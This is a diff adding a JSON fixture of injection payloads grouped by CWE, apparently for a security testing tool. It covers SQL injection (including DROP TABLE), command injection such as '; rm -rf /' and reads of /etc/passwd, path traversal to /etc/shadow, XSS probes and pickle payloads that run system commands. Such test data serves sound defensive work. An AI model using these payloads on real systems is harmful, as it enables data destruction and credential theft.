@@ -1,0 +1,118 @@
+{
+  "CWE-89": {
+    "name": "SQL Injection",
+    "payloads": {
+      "tautology": [
+        "' OR '1'='1",
+        "' OR '1'='1'--",
+        "' OR 1=1--",
+        "admin'--",
+        "' OR ''='"
+      ],
+      "union": [
+        "' UNION SELECT * FROM users--",
+        "' UNION SELECT 1,2,3--"
+      ],
+      "stacked": [
+        "'; DROP TABLE users;--",
+        "'; DELETE FROM users WHERE '1'='1"
+      ],
+      "comment": [
+        "admin'/*",
+        "*/OR/**/1=1/*"
+      ]
+    }
+  },
+  "CWE-78": {
+    "name": "Command Injection",
+    "payloads": {
+      "semicolon": [
+        "; cat /etc/passwd",
+        "; rm -rf /",
+        "; whoami"
+      ],
+      "and": [
+        "&& cat /etc/passwd",
+        "&& whoami"
+      ],
+      "or": [
+        "|| cat /etc/passwd",
+        "|| whoami"
+      ],
+      "pipe": [
+        "| cat /etc/passwd",
+        "| whoami"
+      ],
+      "substitution": [
+        "$(cat /etc/passwd)",
+        "`whoami`"
+      ]
+    }
+  },
+  "CWE-22": {
+    "name": "Path Traversal",
+    "payloads": {
+      "relative": [
+        "../../../etc/passwd",
+        "..\\..\\..\\etc\\passwd",
+        "....//....//etc/passwd"
+      ],
+      "absolute": [
+        "/etc/passwd",
+        "/etc/shadow"
+      ],
+      "encoded": [
+        "%2e%2e%2fetc/passwd",
+        "..%2fetc/passwd"
+      ]
+    }
+  },
+  "CWE-79": {
+    "name": "Cross-Site Scripting",
+    "payloads": {
+      "script": [
+        "<script>alert('XSS')</script>",
+        "<script>alert(1)</script>"
+      ],
+      "event": [
+        "<img onerror=\"alert('XSS')\" src=x>",
+        "<body onload=\"alert('XSS')\">"
+      ],
+      "javascript": [
+        "javascript:alert('XSS')",
+        "<a href=\"javascript:alert('XSS')\">click</a>"
+      ]
+    }
+  },
+  "CWE-502": {
+    "name": "Insecure Deserialization",
+    "payloads": {
+      "pickle": [
+        "cos\\nsystem\\n(S'cat /etc/passwd'\\ntR.",
+        "cposix\\nsystem\\n(S'id'\\ntR."
+      ]
+    }
+  },
+  "CWE-798": {
+    "name": "Hardcoded Credentials",
+    "payloads": {
+      "test_values": [
+        "unique_test_password_12345",
+        "env_test_secret_67890"
+      ]
+    }
+  },
+  "CWE-327": {
+    "name": "Weak Cryptography",
+    "payloads": {
+      "weak_algorithms": [
+        "md5",
+        "sha1"
+      ],
+      "test_inputs": [
+        "password123",
+        "secret_data"
+      ]
+    }
+  }
+}
